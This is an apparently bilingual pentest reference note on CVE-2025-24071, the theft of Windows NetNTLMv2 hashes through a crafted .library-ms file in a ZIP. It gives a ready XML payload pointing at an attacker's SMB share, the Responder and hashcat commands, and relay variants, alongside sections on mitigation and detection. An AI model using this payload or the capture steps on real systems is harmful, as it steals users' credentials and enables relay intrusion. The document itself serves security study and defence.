---
topic: .library-ms — NetNTLMv2 leak when opening a resource
tags: [windows, ntlm, library-ms, smb, cve-2025-24071, credential-leak]
---

# .library-ms — NetNTLMv2 leak when opening a resource

[🌐 Español](library-ms-ntlm-leak.md) | **English**

## Concept

Windows Explorer processes `.library-ms` and `.searchConnector-ms` files to define search locations. If the XML points at a UNC path, Explorer tries to authenticate to that SMB server and sends the NetNTLMv2 hash of the user who opened the file. CVE-2025-24071 covers the case where a file inside a ZIP is processed automatically on extraction.

## When it applies

- A user or service opens a ZIP or folder containing a `.library-ms`.
- The host allows outbound SMB.
- The resource points at an attacker-controlled server.
- The account has useful domain privileges.

## Procedure

1. Create the XML with a UNC path to the listener.
2. Include it in a ZIP the victim will extract or open.
3. Start Responder or `ntlmrelayx` to capture authentication.
4. Crack the NetNTLMv2 with `hashcat -m 5600`.
5. Reuse the password or relay the hash if possible.

## Commands

```xml
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation><url>\\<IP>\share</url></simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

```bash
responder -I tun0
hashcat -m 5600 hash.txt rockyou.txt
```

## Variants

- `.searchConnector-ms` with the same structure.
- A `\\<IP>\share\icon.ico` path to force icon loading.
- SMB relay to another host when signing is not required.
- Combine it with a decoy document.

## Limitations

- Outbound SMB must be allowed.
- SMB signing can stop the relay but not the capture.
- The hash must be crackable or relayable.
- The user must open or extract the file.

## Mitigation

- Block outbound SMB at the perimeter and on endpoints.
- Apply WDAC/AppLocker rules to `.library-ms`.
- Disable automatic thumbnail generation for remote paths.
- Use low-privilege credentials for service accounts.

## Detection

- Outbound SMB connections to uninventoried IPs.
- NTLM authentication from workstations to external servers.
- `.library-ms` files inside ZIPs or email.
- Events 4624/4776 with unexpected origins.

## References

- [NVD — CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071)
- [Microsoft — Security Update Guide](https://msrc.microsoft.com/update-guide/)
- [0xdf — NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
